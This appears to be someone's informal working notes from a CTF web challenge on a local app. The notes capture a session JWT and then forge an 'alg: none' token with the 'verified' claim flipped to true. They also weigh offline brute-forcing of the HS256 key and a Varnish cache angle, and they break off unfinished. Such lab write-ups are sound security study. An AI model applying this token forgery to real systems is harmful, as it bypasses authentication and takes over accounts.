
**So, I will try getting the JWT for icarus from my local session and see what we have:

what I want to get to is:
**
http://127\.0\.0\.1/transactions

**First, logged in as him:**

http://127\.0\.0\.1/
icarus
FlyHighToTheSky


Grabbed the JWT: 

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.eyJ1c2VybmFtZSI6ImljYXJ1cyIsIm90cGtleSI6dHJ1ZSwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE2NTI2NDY2Mjh9\.mQrUPJjXrM23ZipIPYQq9auEFnoOXjoYprA\_iNpUMhE

Looked at the JWT in use here for the session cookie\. its HS256:

\{
"alg": "HS256",
"typ": "JWT"
\}

**Tried setting to none:**

\{
"alg": "none",
"typ": "JWT"
\}

**Base64 to :**
ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K

**Tried setting verify to true:**

\{
"username": "icarus",
"otpkey": true,
"verified": true,
"iat": 1652646628
\}

eyJ1c2VybmFtZSI6ImljYXJ1cyIsIm90cGtleSI6dHJ1ZSwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY1MjY0NjYyOH0

Used key:

ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K\.eyJ1c2VybmFtZSI6ImljYXJ1cyIsIm90cGtleSI6dHJ1ZSwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY1MjY0NjYyOH0\.

**So, we can try to brute force the symmetric key offline I guess\.\.
**
**Grabbed the newest JTR and converted this to jwt\.hash:
Looked for how many digits this thing is, **

**Doesn't matter, going to be too much to crack, not giong to be in this CTF I'm sure\.\.\.
**
**However, with varnish being here, I think this might be the target, if i can get a cache hit for:**

let token = await JWTHelper\.sign\(\{ username: 'icarus', otpkey: true, verified: true \}\);
await page\.setCookie\(\{
name: "session",
'value': token,
domain: "127\.0\.0\.1"
\}\);
await page\.goto\('[http://127.0.0.1/transactions',](#http://127.0.0.1/transactions',)
\{
waitUntil: 'networkidle2',
timeout: 5000
\}\);


**So, I want**[http://127.0.0.1/transactions](#http://127.0.0.1/transactions)
\.\.\.
**Looks like a header would be:
**

